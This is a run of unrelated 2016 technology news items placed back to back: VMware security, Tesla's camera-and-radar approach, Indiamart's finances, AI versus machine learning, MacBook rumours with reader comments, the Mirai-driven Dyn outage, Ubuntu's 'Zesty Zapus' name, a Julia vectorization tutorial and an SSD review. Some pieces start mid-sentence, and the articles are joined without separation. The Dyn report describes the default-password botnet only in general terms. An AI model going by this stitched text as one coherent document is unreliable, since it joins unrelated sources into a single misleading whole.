whittled away after a week as VMware launched vSphere 6.5 with UEFI-secured boot for hosts and guests, plus encryption for VMs in motion. For now VSphere itself can use TPM, but Virtzilla's guests can't do virtual TPM. So Microsoft's got a little lead here for now. The Register understands that VMware's Project Goldilocks security product may not be far from its formal debut, so perhaps Virtzilla's security story is about to gain a new chapter. For what it's worth, it looks like Xen has had virtual TPM since version 4.3 and that contributions from the NSA helped make it a reality. Which means Shielded VMs are NSA-grade security.

Tech News Home > Tech > Tech News < Back to SMG 45 Friday, 21 October 2016 | MYT 9:17 AM Tesla, rivals joust over how to put self-driving cars on the road No lidar: Tesla's self-driving system will rely on cameras and radar sensors. — Reuters Tesla Motors Inc's decision to equip all of its vehicles with self-driving hardware has intensified competition among rival camps of technology and auto companies over what equipment will be on board cars of the future. Tesla's self-driving system will rely on cameras and radar sensors – but not lidar, the laser imaging technology most other companies pursuing self-driving cars are using to generate precise pictures of the environment around their vehicles. Tesla also is not using technology from Mobileye , the Israeli-based supplier of computer vision chips and software that provided components for earlier Tesla models equipped with Autopilot, a semi-automated system designed to assist with driving but not replace the driver. Tesla chief executive Elon Musk and Mobileye this summer engaged in a public dispute over the safety of Autopilot following a fatal crash in May in which the driver of a Tesla Model S was killed after hitting a truck while driving on Autopilot. "Selling a vehicle with the latest and greatest hardware, but an unproven self-driving software package is a risky strategy," said Barclays analyst Brian Johnson. Mobileye supplies two dozen other automakers and suppliers, and has formed alliances to pursue self-driving vehicle systems with German automaker BMW AG, US supplier Delphi and chip maker Intel. "As we move to a higher level of autonomy in vehicles, you're going to want to have more redundancy," which radar and lidar can provide, Dan Galves, senior vice president at vision safety system maker Mobileye, said in an interview. "The more sensors, the better." A winner in the fallout from the Tesla-Mobileye dispute is Nvidia, the Silicon Valley chipmaker that will provide processors for the new Tesla system. No automaker, including Tesla, currently offers a fully self-driving car, although most major manufacturers and suppliers are working furiously on different technology suites – including cameras, radar and lidar – to enable vehicles to drive themselves. Google's self-driving cars use a combination of lidar, radar and cameras. The company has said the multi-sensor approach compensates for the limitations of each type of sensor. Cameras do not perform well in the dark or in bright light. Ice and snow can block a camera's view. Lidar can create a 360 degree view of the car's surroundings, although it is less effective in fog, rain and snow. The high cost of lidar, currently about US$8,000 (RM33,470) , is just one of the obstacles to putting self-driving cars in consumers' hands. But the cost is rapidly declining and is expected to fall to US$25 (RM105) -US$100 (RM420) in the coming years. Ford Motor Co, an investor in lidar manufacturer Velodyne, said it does not plan to put a fully self-driving vehicle into production for ride-sharing fleets until 2021 and for individual consumers until 2025 or later. Toyota Motor Corp has said it does not expect to see Level 5 vehicles – those capable of fully automated operation without humans in all situations – in widespread use for another 10-15 years. Major automotive technology suppliers, including Delphi Automotive PLC, Robert Bosch GmbH, Continental AG and Valeo SA, are all developing self-driving technology and systems that incorporate lidar. Without lidar, Tesla "will not be able to handle all situations with this array of sensors," said Marta Hall, head of California-based Velodyne, one of the largest suppliers of automotive lidar. UBS analyst Colin Langan raised a concern that while excluding lidar could lower the overall cost of a self-driving system – now pegged by Tesla at $8,000 without lidar – "it would increase negative scrutiny" if it is proven that a lidar sensor could have prevented a fatal accident. Regulators have signaled they intend to keep tighter reins on automakers and other companies, including Alphabet Inc's Google self-driving car project and Uber Technologies, as they roll out self-driving vehicles on public roads. Summarising the concerns of other automakers and suppliers involved in developing self-driving systems, Langan said Tesla's early deployment of full automation "without enough testing could have negative long-term consequences" for widespread adoption of self-driving technology. "Lidars are becoming very inexpensive, and they will always add an additional safety layer. So in these early days of self-driving, I wonder why anyone wouldn't want to use lidars for added safety," said Sebastian Thrun, former head of Google's self-driving car project. —  Reuters You May Be Interested Closure of 106 bank branches due to rationalisation plans, says Deputy Finance Minister Weak ringgit to impact 5 sectors Best smartphones for the holidays Alibaba's founder to support 'mini Jack Ma' until university graduation Private-public partnerships in a connected world Rejuvenate yourself with American ginseng Others Also Read Tourists now prefer lodgings with Airbnb flavour, hoteliers told Widespread apathy hampers recycling campaign MRT fare starts at RM1 advertisement Latest News Photo Kit: Taking better photos of your pets (and kids) US trade panel eyes Qualcomm patent complaint against Chinese firms Google commits to post-Brexit UK with major London investment GE acquires two artificial intelligence startups Singapore to launch blockchain project for interbank payments Most Viewed in Tech GE acquires two artificial intelligence startups Best smartphones for the holidays Singapore to launch blockchain project for interbank payments Photo Kit: Taking better photos of your pets (and kids) Google commits to post-Brexit UK with major London investment Warning!

Home Industry Companies Indiamart reports Rs 40-crore loss in FY16 Indiamart reports Rs 40-crore loss in FY16 B2B marketplace Indiamart reported a loss of R40 crore in the year to March 2016 on revenues of R300 crore, Dinesh Agarwal, CEO of Indiamart told FE. By: Hita Gupta | New Delhi | Updated: October 21, 2016 7:13 AM B2B marketplace Indiamart reported a loss of R40 crore in the year to March 2016 on revenues of R300 crore, Dinesh Agarwal, CEO of Indiamart told FE. Revenues rose a smart 40% over FY15 and the company is targetting another 40% jump in FY17. Agarwal added the losses would come down in FY17. The Noida-based company is a B2B marketplace for small, medium and large-sized enterprises that connects buyers to suppliers based on the requirements. The company has raised funds across three rounds from Brand Capital, Intel Capital, Amadeus Capital Partners, Accion Frontier Inclusion Fund and WestBridge Capital. The customer acquisition cost for Indiamart is R15,000, which is a one-time fee. the marketplace is adding 20,000 paying suppliers and 100,000 free suppliers every month. Indiamart’s revenue model works on lead generation and it earns no commission on conversion. Irrespective of the conversion that takes place on the platform, Indiamart charges a subscription or a pre-paid fee to the supplier for every lead. In the pre-paid model, the supplier can be listed on the platform for free but he will have to purchase the lead from Indiamart. “A lead cost typically R449 but through this package the supplier can buy a lead for as low as R200,” Sumit Bedi, vice president – marketing, Indiamart explained. Under the subscription package, Indiamart will charge a subscription fee and give the supplier listing on the site, cataloging services and better lead and content management.The subscription starts from R2,500 and goes to R2.5 lakh, per month, according to Agarwal. Indiamart has 110,000 paid suppliers on the platform. About 25,000 of them have 3-year or multi-year subscription; 30,000 have an annual subscription and 55,000 have a monthly subscription. In 2014, Indiamart launched its subsidiary Tolexo, an online marketplace for industrial goods. According to Agarwal, the company clocks gross merchandise value of $1 billion every month and earns a commission in the range of 12-18%. In FY15, Indiamart had invested $10 million in Tolexo and committed another $15 million each for FY16 and FY17. Collectively, Agarwal is targetting R2,000 crore in revenue by 2020 from three businesses – Indiamart, Tolexo and ProcMart Please Wait while comments are loading...

AI and machine learning are very much related, but they're not quite the same thing By Lee Bell 23 Oct 2016 By Lee Bell Sunday 23 October 2016 Kirill_Savenko/iStock Thanks to the likes of Google, Amazon, and Facebook, the terms artificial intelligence (AI) and machine learning have become much more widespread than ever before. They are often used interchangeably and promise all sorts from smarter home appliances to robots taking our jobs.

Read more Google's Digital Justice League: how its Jigsaw projects are hunting down online trolls Google's Digital Justice League: how its Jigsaw projects are hunting down online trolls By Andy Greenberg AI is a branch of computer science attempting to build machines capable of intelligent behaviour, while  Stanford University defines machine learning as “the science of getting computers to act without being explicitly programmed”.   You need AI researchers to build the smart machines, but you need machine learning experts to make them truly intelligent. Big technology players such as Google and Nvidia are currently working on developing this machine learning; desperately pushing computers to learn the way a human would in order to progress what many are calling the next revolution in technology – machines that 'think' like humans. Over the past decade, machine learning has given us self-driving cars, practical speech recognition, effective web search, and a vastly improved understanding of the human genome. But how does it work?

When you make a typo, for instance, while searching in Google, it gives you the message: "Did you mean..."? This is the result of one of Google's machine learning algorithms; a system that detects what searches you make a couple seconds after making a certain search. An artist's impression of a Differentiable Neural Computer DeepMind For example, suppose you were searching for 'WIRED' on Google but accidentally typed 'Wored'. After the search, you'd probably realise you typed it wrong and you'd go back and search for 'WIRED' a couple of seconds later. Google’s algorithm recognises that you searched for something a couple of seconds after searching something else, and it keeps this in mind for future users who make a similar typing mistake. As a result, Google 'learns' to correct it for you.

Programs that learn from experience are helping them discover how the human genome works, understand consumer behaviour to a degree never before possible and build systems for purchase recommendations, image recognition, and fraud prevention, among other uses. So now you have a basic idea of what machine learning is, how is it different to that of AI? We spoke to Intel’s Nidhi Chappell, head of machine learning to clear this up. “AI is basically the intelligence – how we make machines intelligent, while machine learning is the implementation of the compute methods that support it. The way I think of it is: AI is the science and machine learning is the algorithms that make the machines smarter. “So the enabler for AI is machine learning,” she added.

Even though it’s a small percentage of the workloads in computing today, it’s the fastest growing area, so that’s why everyone is honing in on that. Microsoft "Simple examples are when you go to a new place and search online for ‘top things to do’, the order you see them in is defined by machine learning, and how they are ranked and rated, this is all machine learning,” Chappell said, adding that it’s the same story for when news is trending.

Machine learning algorithms still have room for improvement, and that’s why a lot of the large technology companies are making it a central focus to their strategy, and working tirelessly to make it more intelligent, in order to push forward and create the next innovation, such as completely autonomous and 100 per cent safe self-driving cars.

Apple will also announce a brand new model of the new MacBook with a screen measuring thirteen inches diagonally, Kuo wrote in a note to clients. Some observers think this machine is actually a thirteen-inch MacBook Air with new USB-C ports. As you know, the current Retina MacBook has a 12-inch Retina display. Next-generation iMacs, as well as a rumored 5K resolution display won’t be unveiled at the event because they’re apparently not ready yet. According to the report, the upcoming MacBook Pro refresh will include two models: one with a thirteen-inch screen and the other with a fifteen-inch one. The new machines should have an OLED touch bar replacing the function key row with programmable shortcuts that change from one app to another, Touch ID sensor (likely integrated into the power button), USB-C, Thunderbolt 3 and the same low-profile keyboard with butterfly mechanism like the new MacBook, among other features. The OLED touch bar would be controlled by a new dedicated chip which Kuo claims bears resemblance to the processor that powers the Apple Watch. From the report: Our new predictions also include: (1) Intel’s (US) Skylake processor; (2) the same panel resolution but better display quality and energy efficiency thanks to an oxide panel; (3) a new option of 2TB SSD storage capacity; (4) adoption of a similar processor as Apple Watch to control the OLED touch bar more energy-efficiently in the new MacBook Pro models; and (5) a Type-C & MagSafe-like adapter rolled out by Apple or a third-party supplier, given positive reviews for the MagSafe charging design. The iMac, Apple’s popular all-in-one desktop, as well as its rumored external display with a 27-inch screen featuring 5K resolution (likely matching the resolution of the 5K iMac) should be expected in the first half of 2017, according to the analyst. We also expect Apple to launch new iMacs (21.5-inch and 27-inch) and Cinema Display (27-inch) in mid-1H17. We cannot say for certain whether Apple will announce the new iMacs and Cinema Display on October 27 as the shipping schedule is not imminent. Although the next iMac and 5K display won’t ship this year, Apple could choose to announce and preview them at Thursday’s event. A few years back, the company previewed the radically redesigned Mac Pro even though the powerful desktop computer wouldn’t start shipping until six months later. Speaking of which, Kuo makes absolutely no mention of any Mac Pro-focused refresh. I hope Apple won’t disappoint its loyal fan base of creative pros who need a powerful desktop, Unfortunately, it’s been increasingly difficult to justify dropping more than three-thousand dollars on the Mac Pro’s three-year-old hardware. The Mac-focused “Hello again” media event is scheduled for October 27 and we will be providing remote coverage of the announcements as they happen.

CAIO MARIZ® Quad Core Kaby Lake doesn’t exist yet 5723alex . Kaby Lake is a crappy CPU. Hope Apple won’t use it. Rolf Bause Yeah, but they are coming in the beginning of 2017. We are waiting for 2 years now with the new MacBooks, without any update, not even a processor update… Might as well wait a few months longer now and at least catch the Intel release cycle. All the other big manufacturers already have Skylake… howcome they are able to do this, and Apple isn’t? CAIO MARIZ® Kaby lake will not support Intel Iris Pro Graphics, so worse battery, they will jump Kaby lake Rolf Bause from what I’ve read they will have an Intel HD Graphics 620… CAIO MARIZ® Less powerful than current Haswell Iris Pro, Broadwell Iris Pro and Skylake Iris Pro Rolf Bause Ok, in this particular case Skylake is probably really the better choice then (what r they thinking at Intel)… But when did this ever happen, that the next gen was worse than the previous? My main point was: Why the hell aren’t they able to synchronize their release cycles better for christ sake? Apple is (as far as I know) Intels biggest buyer of chips… you could really expect better imo. CAIO MARIZ® I don’t know why they can’t synchronize their release cycles with the intel’s ones Jack Wong Other than i5 and 2013 mid MacBook Air, I don’t even remember what is the name of my processors?! Does it really matter? Rolf Bause Yes it does. Jack Wong Would you mind to list one to two benefit of that? Rolf Bause The benefit is that you know if you got the latest technology or not and if you got screwed or not 😉 And you probably have a Haswell btw Jack Wong I don’t really concern about the CPU anymore, how powerful it could be on a laptop. I would rather have 16GB ram, longer battery life and more cheap SSD storage on the Air since the task I am doing the most are just browsing, remote into other computers and word/excel file. I don’t convert video that often. But it seems like Apple doesn’t want to give that 16GB RAM to the MacBook and MacBook Air line… Rolf Bause You don’t need 16GB of RAM for any of this 😉 But in general I’m with you there. The RAM and SSD upgrade option are just ridiculous… it’s pure greed. If Xiaomi develop their Mi notebooks some more (idk, v2-3 or so :D)… I’ll maybe give it a shot and make a hackintosh :D. They give you all these things: removeable ssd, 2nd ssd slot – for half the price. Jack Wong Yes/No, I am trying so hard to utilize the ram usage on the Virtual Box, plugins and browsers… Just like do we need 1TB SSD storage on laptop?! Yes/No, I would be more lazy to organize if I have 1TB storage but like you said… the upgrade price for SSD is ridiculous… I have 8GB ram and 512GB SSD, 256GB originally, but I got really lucky to get a 512GB SSD(pulled from MacBook Pro) from eBay for $375 last year then sold the 256GB for $200. If I want any Mac laptop with 512GB… it would cost me 1.5k+… I guess… I can only have 1 wish for my next laptop, either USB-C chargeable or 16GB ram. Rolf Bause Transcend has some decent SSD upgrades (Transcend JetDrive). 500gb cost a little less than 300 bucks… 1tb around 500. Jack Wong Those are not as fast, no thank you. If there is no new laptop that I can afford/like on this Thurs, then I would get a new battery for the current Air, I will also go for OEM instead of third party. Rolf Bause The PCI-e based ones aren’t as fast… the SATA drives are supposed to be fine. askep3 “The OLED touch bar would be controlled by a new dedicated chip which Kuo claims bears resemblance to the processor that powers the Apple Watch.” This way the main processsor doesn’t have to handle the touch bar! Alan Aurmont So, the lineup: Air is dead Mini will be dead soon It all leads to the following naming: iPad – iPad Pro iPhone – iPhone Pro (next year with iPhone 8) Mac – Mac Pro MacBook – MacBook Pro Now, the size is where I’m not quite sure what’s gonna happen. 13″ MacBook makes it all confusing. Will they revive 11″ and kill 12″? If they do, we may have 11″/13″ MacBook and 13″/15″ MacBook Pro. 12″ alongside 13″ just wouldn’t make any sense.

SANGER and NICOLE PERLROTHOCT. 22, 2016 Continue reading the main story Share This Page Continue reading the main story Photo Dyn DNS, a company that essentially acts as a giant internet switchboard, was bombarded with messages that overloaded its circuits. Credit Nathaniel Brooks for The New York Times WASHINGTON — When surveillance cameras began popping up in the 1970s and ’80s, they were welcomed as a crime-fighting tool, then as a way to monitor traffic congestion, factory floors and even baby cribs. Later, they were adopted for darker purposes, as authoritarian governments like China’s used them to prevent challenges to power by keeping tabs on protesters and dissidents. But now those cameras — and many other devices that today are connected to the internet — have been commandeered for an entirely different purpose: as a weapon of mass disruption. The internet slowdown that swept the East Coast on Friday, when many Americans were already jittery about the possibility that hackers could interfere with election systems, offered a glimpse of a new era of vulnerabilities confronting a highly connected society. The attack on the infrastructure of the internet, which made it all but impossible at times to check Twitter feeds or headlines, was a remarkable reminder about how billions of ordinary web-connected devices — many of them highly insecure — can be turned to vicious purposes. And the threats will continue long after Election Day for a nation that increasingly keeps its data in the cloud and has oftentimes kept its head in the sand. Remnants of the attack continued to slow some sites on Saturday, though the biggest troubles had abated. Still, to the tech community, Friday’s events were as inevitable as an earthquake along the San Andreas fault. A new kind of malicious software exploits a long-known vulnerability in those cameras and other cheap devices that are now joining up to what has become known as the internet of things. Continue reading the main story Advertisement Continue reading the main story The advantage of putting every device on the internet is obvious. It means your refrigerator can order you milk when you are running low, and the printer on your home network can tell a retailer that you need more ink. Security cameras can alert your cellphone when someone is walking up the driveway, whether it is a delivery worker or a burglar. When Google and the Detroit automakers get their driverless cars on the road, the internet of things will become your chauffeur. Advertisement Continue reading the main story But hundreds of thousands, and maybe millions, of those security cameras and other devices have been infected with a fairly simple program that guessed at their factory-set passwords — often “admin” or “12345” or even, yes, “password” — and, once inside, turned them into an army of simple robots. Each one was commanded, at a coordinated time, to bombard a small company in Manchester, N.H., called Dyn DNS with messages that overloaded its circuits. Few have heard of Dyn, but it essentially acts as one of the internet’s giant switchboards. Bring it to a halt, and the problems spread instantly. It did not take long to reduce Twitter, Reddit and Airbnb — as well as the news feeds of The New York Times — to a crawl. The culprit is unclear, and it may take days or weeks to detect it. In the end, though, the answer probably does not mean much anyway. The vulnerability the country woke up to on Friday morning can be easily exploited by a nation-state such as Russia, which the Obama administration has blamed for hacking into the Democratic National Committee and the accounts of Hillary Clinton’s campaign officials. It could also be exploited by a criminal group, which was the focus of much of the guesswork about Friday’s attack, or even by teenagers. The opportunities for copycats are endless. The starkest warning came in mid-September from Bruce Schneier, an internet security expert, who posted a brief essay titled “Someone Is Learning How to Take Down the Internet.” The technique was hardly news: Entities like the North Korean government and extortionists have long used “distributed denial-of-service” attacks to direct a flood of data at sites they do not like. “If the attacker has a bigger fire hose of data than the defender has,” he wrote, “the attacker wins.” But in recent times, hackers have been exploring the vulnerabilities of the companies that make up the backbone of the internet — just as states recently saw examinations of the systems that hold their voter registration rolls. Attacks on the companies escalated, Mr. Schneier wrote, “as if the attack were looking for the exact point of failure.” Think of the mighty Maginot Line, tested again and again by the German Army in 1940, until it found the weak point and rolled into Paris.

Privacy Policy The difference with the internet is that it is not clear in the United States who is supposed to be protecting it. The network does not belong to the government — or really to anyone. Instead, every organization is responsible for defending its own little piece. Banks, retailers and social media hubs are supposed to invest in protecting their websites, but that does not help much if the connections among them are severed. The Department of Homeland Security is supposed to provide the baseline of internet defense for the United States, but it is constantly playing catch-up. In recent weeks, it deployed teams to the states to help them find and patch vulnerabilities in their voter registration systems and their networks for reporting results. Advertisement Continue reading the main story The F.B.I. investigates breaches, but that takes time — and, in the meantime, people want to bank online and stream television shows. On Nov. 8, Americans will have to look up where they are supposed to vote, and, in a few cases, they will cast their votes on the internet. Yet the voting system is not considered part of the nation’s “critical infrastructure.” The head of the National Security Agency, Adm. Michael Rogers, said recently that experts were looking at the problem the wrong way. “We are over-focused on places and things,” he said in a talk at Harvard. “We need to focus on the data,” and how it flows — or doesn’t flow. That is where the internet of things comes in. Most of the devices have been hooked up to the web over the past few years with little concern for security. Cheap parts, some coming from Chinese suppliers, have weak or no password protections, and it is not obvious how to change those passwords. And the problem is quickly expanding: Cisco estimates that the number of such devices could reach 50 billion by 2020, from 15 billion today. Intel puts the number at roughly 200 billion devices in the same time frame. (Assuming the global population is around 7.7 billion people in 2020, that would be about six to 26 devices per person.) Security researchers have been warning of this problem for years, but that caution has largely been written off as hype or fear-mongering. Then Brian Krebs, who runs a popular site on internet security, was struck by a significant attack a few weeks ago. The company protecting him, Akamai, gave up. The malware behind the attack, called Mirai, had a built-in dictionary of common passwords and used them to hijack devices to become attackers. Chester Wisniewski, a principal computer research scientist at Sophos, a security company, said that attacks like the one on Dyn “might be the beginning of a new era of internet attacks conducted via ‘smart’ things.” “There are tens of millions more insecure ‘smart’ things that could cause incredible disruptions, if harnessed,” Mr. Wisniewski added in an email. It is possible, investigators say, that the attack on Dyn was conducted by a criminal group that wanted to extort the company. Or it could have been done by “hacktivists.” Or a foreign power that wanted to remind the United States of its vulnerability. The answer may not come by Election Day, but the next wave of attacks very well could. David E. Sanger reported from Washington, and Nicole Perlroth from San Francisco.

For whatever reason, the maintainers of these operating systems seem to enjoy having fun with what they call them -- some argue it is childish. Even Google -- a billion dollar company -- uses sugary dessert names for the Linux-based Android operating system. One of the most well-known Linux distributions to use funny names is Ubuntu. It famously uses the convention of an adjective and a lesser-known animal, each starting with the same letter. The letter is chosen sequentially by alphabet. For example, Ubuntu 16.10 uses the letter "Y" -- "Yakkety Yak". The next version of the operating system will use the letter "Z". While many folks hoped for "Zebra", that would be too obvious. Instead, Canonical has chosen "Zesty Zapus". Don't know what a zapus is? Neither did I. It is apparently a type of jumping mouse. The selection was not made at random, however, as the company has an explanation for the decision. "As we come to the end of the alphabet, I want to thank everyone who makes this fun. Your passion and focus and intellect, and occasionally your sharp differences, all make it a privilege to be part of this body incorporate. Right now, Ubuntu is moving even faster to the centre of the cloud and edge operations. From AWS to the zaniest new devices, Ubuntu helps people get things done faster, cleaner, and more efficiently, thanks to you. From the launch of our kubernetes charms which make it very easy to operate k8s everywhere, to the fun people seem to be having with snaps at snapcraft.io for shipping bits from cloud to top of rack to distant devices, we love the pace of change and we change the face of love", says Mark Shuttleworth, CEO, Canonical. ALSO READ: System76 updates its affordable Ubuntu Linux 'Lemur' laptop with Intel Kaby Lake Shuttleworth further says, "we are a tiny band in a market of giants, but our focus on delivering free software freely together with enterprise support, services and solutions appears to be opening doors, and minds, everywhere. So, in honour of the valiantly tiny leaping long-tailed over the obstacles of life, our next release which will be Ubuntu 17.04, is hereby code named the Zesty Zapus". There you have it folks, "Zesty Zapus". The obvious question is, what will come next? As we find ourselves at the end of the alphabet, it is unclear what Canonical will do next. Will the company start again at A? If so, will it choose something other than adjectives and animals? What do you think Canonical should do? Tell me in the comments.

juliabloggers.com A Julia Language Blog Aggregator Menu Skip to content Home Submit Your RSS Feed Optimizing .*: Details of Vectorization and Metaprogramming By: Christopher Rackauckas Re-posted from: http://www.stochasticlifestyle.com/an-in-depth-look-at-vectorization/ For many of us mathematicians, we were taught to use MATLAB, and we were taught to vectorize everything. I mean obviously if we have matrices , , and and want to multiply element-wise (say to solve a reaction-equation at each point in space), then the optimal code is A.*B.*C No questions to ask, right? Actually, this code isn’t as optimized as you’d think. Lets dig deeper. BLAS, Linpack, and MKL The reason you are always told by “the lords of numerical math” to vectorize your code is because very smart programmers worked really hard on making basic things work well. Most of the “standardized” vectorized computations are calling subroutines from packages known as BLAS and LINPACK. To see what version your MATLAB is using, you can call version -blas
version -linpack So every time you call svd, A*B, etc., you are actually calling a highly-optimized state of the art C/Fortran/Assembly code mixture which does all sorts of things to make sure you don’t have cache misses, have the function multi-threaded (i.e. these functions will run parallel on your multi-core machine), and much more! But A.*B doesn’t do a BLAS call! When you use A.*B in MATLAB, it uses its own C-code to loop through an perform this operation. This causes a few problems. First of all, if you are using co-processors/accelerators such as the Xeon Phi, the option of automatically offloading highly-vectorized problems to a GPU-like device only offloads BLAS/LINPACK calls. Therefore A*B gets accelerated whereas A.*B does not. Another thing is that, as far as I can tell, A.*B does not have all of the processor-specific optimizations to make this operation super fast. This is huge since processor technologies like AVX2 allows specific vector operations to do calls on 8 numbers at a time, making highly-parallel math operations like this get close to an 8x speedup if used correctly (and AVX3 is coming out soon to double that!). So the simple A.*B is good for prototyping, but from benchmarking many SPDE solvers I realized this was holding me back. How can we do better? Well, we can replace .* with vector operations from MKL by directly calling MKL VML functions. MATLAB has a page on how to use the max interface to call BLAS/LINPACK functions and using this with the v?mul (i.e. vdmul for 64-bit floats). Thus to do this in MATLAB you have to write some C code. Fun! Number of Operations ~ Number of Calls However, this STILL isn’t optimal! Too see this, let us write out what MATLAB’s interpreter turns this into: times(times(A,B),C) Thus the behind the scenes looks something like this: for i = 1:N
  for j = 1:M
     temp = A[i,j] * B[i,j];
  end
end
 
%Some function call overhead to return temp, save it to temp2
 
for i = 1:N
  for j = 1:M
     temp3 = temp2[i,j] * C[i,j];
  end
end
 
%Return temp3 Instead of one NxM loop, we did two NxM loops, effectively doubling the amount of computations required! Now think about solving reactions like: A.*B.*C + D.*E*gamma + Diffusion*A; you see that simple vectorization is actually far from optimal. Not only did we have to do extra loops, but we also had to make a bunch of temporary variables and garbage collect. What we really want to do is something like: for i = 1:N
  for j = 1:M
     temp = A[i,j] * B[i,j] *C[i,j];
  end
end How do you do this in MATLAB? Once again, the answer is to write C-code via the MEX interface. You can do this if you want. Julia’s Approach Lets look at if Julia does any better. Since Julia is opensource, we can actually look directly at the source code. Since it’s written in Julia and hosted on github it’s easy to go through the details. In the Julia REPL, we can find out what function is actually called by looking at: julia> methods(.*)

For example, if you do .5.*(1:100), 1:100 is not an array but a special Julia type known as a range, and so .* calls the function .*(x::Number, r::Range{T}) which can be found in range.jl at line 647. For A.*B, we are want .*(A::AbstractArray{T,N}, B::AbstractArray{T,N}) at sparse/sparsematrix.jl:1026 Surprisingly, it’s actually defined in the sparematrix.jl file. Find that file on GitHub and we see that it is defined as:  
(.*)(A::AbstractArray, B::AbstractArray) = broadcast_zpreserving(MulFun(), A, B)
...
broadcast_zpreserving!(args...) = broadcast!(args...) MulFun() is the what Julia translates * into, and so this means that when Julia sees A.*B, it calls broadcast on the * function. In the Julia documentation we see that broadcast simply calls the function on all of the array members. This is what we’d expect it to do, but is it better than if we were to write a loop? We check broadcast.jl and find:         function broadcast!(f, B::$Bsig, As::$Asig...)
            nd = ndims(B)
            narrays = length(As)
 
            cache_f    = @get! cache      f       Dict{Int,Dict{Int,Any}}()
            cache_f_na = @get! cache_f    narrays Dict{Int,Any}()
            func       = @get! cache_f_na nd      $gbf($gbb, nd, narrays, f)
 
            func(B, As...)
            B
        end which shows that it speeds up the operation by storing the function in cache. So moral of the story, A.*B uses broadcast which will beat your simple loop because of cache-control. Can We Do Better? Now just like MATLAB’s .* we have to ask, can we do better? Well, the first things we can do is use MKL VML bindings in Julia. With that packages you can plug it in and call the functions with ease (once vdmul gets added…). We can even over-write .* so that VML is used by default. However, we still have the problem we noted with MATLAB that the most efficient way would be to de-vectorize and write a loop which does multiple operations at once. If you aren’t familiar with metaprogramming, it is simply using programs to write programs. MATLAB’s inability to metaprogram means we needed to go to C to write a loop, but that loop only works for exactly the type of inputs we had. It also causes problems since MATLAB’s anonymous functions are notoriously slow and so if you write a function that makes a function and you make it into an anonymous function (i.e. @(x) …), then you will have at least a 2x slowdown in your code over written the function yourself. Thus in MATLAB’s inability to metaprogram means you have to write a lot of code. This is where Julia being a newer langugage comes to the rescue. It is chalk-full of metaprogramming abilities. What we are going to use here are macros. In a previous post I used macros such as @simd without explaining what it did. Well, a macro is simply a type of metaprogramming function that re-writes the code associated with it. It’s best explained by an example. There is a de-vectorization module for Julia which contains the @devec macro. What is does is take a vectorized expression like: r = a .* b + c .* d + a and re-writes it as a de-vectorized loop: n = length(a)
r = zeros(n)
for i = 1 : n
    r[i] = a[i] * b[i] + c[i] * d[i] + a[i]
end In MATLAB we can’t use loops for high-performance code because they are not optimized, so we had to take our equations, write C-code, compile it, make sure it all works, get rid of segmentation faults… it wasn’t fun. In Julia, loops are optimized so there’s no reason to go to C to write the loop, and here the macro @devec does the same thing. Therefore, to make the optimized loop in Julia, we write @devec r = a .* b + c .* d + a Thus the difference between your “high-performance code” and your prototype code is @devec. Welcome to the future folks. Going all the way: Optimizing the loop That’s not necessarily the end. Remember that BLAS/MKL/VML uses technologies like SIMD/AVX in order to do multiple operations per computation? Intel has written a Julia macro which will take loops and vectorize them in this manner by adding the macro @simd before the loop. MKL also speeds up computations by lowering the precision in the math which can be done with the @fastmath macro. Lastly, we can to turn off array out of bounds checking to make things faster as well. Thus what we really want is @devec to write the code: n = length(a)
r = zeros(n)
@simd for i = 1 : n
    @fastmath @nobounds r[i] = a[i] * b[i] + c[i] * d[i] + a[i]
end By adding @fastmath @nobounds before @devec we can get that part changed. What about adding @simd? Macros can take in arguments, and the developer for @devec is looking to add a context argument so you can tell it to expand with @simd, @parallel (for multi-cpu), or even with Cuda (i.e. run this on GPU in parallel), OpenCL and others. Multi-threaded will probably be added as well when it’s added to Julia’s base library. If you want it done faster, just contribute to the github repository!. I do have to mention a caveat. There are codes where @devec will not work. For example, sqrt(exp(A*B)) where A and B are matrices. Even though it’s simple to see how we’d want to vectorize it, writing something that will go “okay, make A*B be a BLAS call, then call sqrt(exp()) on that” is hard to do generally. The creator of @devec is looking into using Julia’s generated functions to perform this kind of task. However, you can always do this by writing the loop out yourself. Or another vectorized implementation would be to use the broadcast function. Both are much easier than going to C and still do quite well performance-wise. (On this note, there is something like broadcast in MATLAB and these are the cellfun, structfun, arrayfun methods. However, they are so slow (except on GPUs where they are the fastest…) that they should never be used). Moral of the Story I hope I showed you that there is much more to making .* achieve its best performance than you originally thought. Of course, in MATLAB, using .* and other vectorized operations is almost always better than writing a loop. Thus in every class you’re told to ALWAYS use vectorized MATLAB functions because it’s best. In reality, that’s not the case. If you want performance, you need especially written loops in a high-performance language and you have to implement cache-handling, AVX/SIMD, multi-threading, etc. In MATLAB, this means writing C-codes and calling it via the MEX interface. This needs to be done for every different setup you encounter. However, in Julia, the @devec macro achieves the same end (almost, and it keeps getting better!). That’s the power of metaprogramming and one of the many reasons why I am trying to use more Julia.

Crucial MX300: Good Linux Performance, 525GB SSD For Only $120 USD Written by Michael Larabel in Storage on 22 October 2016. Page 1 of 3. 21 Comments This week I was shopping for a solid state drive to replace a hard drive on one of my backup/archival systems and ended up settling for the Crucial MX300 in getting 525GB of storage for just $120 USD. Here are some benchmarks of the Crucial CT525MX300SSD1 compared to some other SSDs on Linux for those curious. The Crucial MX300 525GB is rated for sequential reads up to 535 MB/s and sequential writes up to 510 MB/s, random reads up to 92K IOPS and random writes up to 83K IOPS. The Crucial MX300 uses Micron's 3D NAND tech. The MX300 series comes in 2.5-inch SSD and M.2 SSD versions while the one I had bought was the CT525MX300SSD1 SSD. This was my first time using a MX300 SSD but have used other Crucial SSDs on various Linux benchmarking test systems to fine success. I turned to this SSD for its rated performance while offering a half terabyte of storage that should be fine for my purposes and costing just $120 USD. The MX300 can be found at Amazon.com (where I purchased it, of course) as well as NewEgg.com. A 1TB version of the MX300 is available for under $250 or the 750GB version for $170. I ran some tests of the Crucial MX300 525GB SSD on my common Ubuntu 16.10 x86_64 Intel Skylake Xeon test setup with the Linux 4.8 kernel and using an EXT4 file-system. The performance was compared to the PNY CS1211, Corsair Force LX 256GB, OCZ Trion TR150 120GB, Intel 600P NVMe 256GB SSD, and Samsung 950 PRO NVMe 256GB SSD. All of these Linux solid-state drive benchmarks were carried out in a fully-automated manner using the open-source Phoronix Test Suite benchmarking software.

